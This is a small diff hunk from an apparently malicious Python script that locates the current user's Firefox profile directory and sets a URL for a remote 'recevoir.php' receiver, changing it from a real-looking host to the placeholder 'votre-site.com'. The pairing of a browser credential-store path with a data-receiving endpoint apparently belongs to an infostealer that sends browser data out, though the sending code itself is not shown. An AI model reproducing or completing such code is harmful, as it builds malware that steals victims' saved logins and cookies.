@@ -35,7 +35,7 @@ startGD = True
 
 user = getpass.getuser()
 mozilla_profile_dir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
-url = 'https://project-sharing.fr.to/TEST/recevoir.php'
+url = 'https://votre-site.com/recevoir.php'
 geolocator = Nominatim(user_agent="geoapi")
 location = geolocator.geocode("Paris, France")
 date_time = datetime.now().strftime("%d-%m-%Y-%Hh%Ms%S")
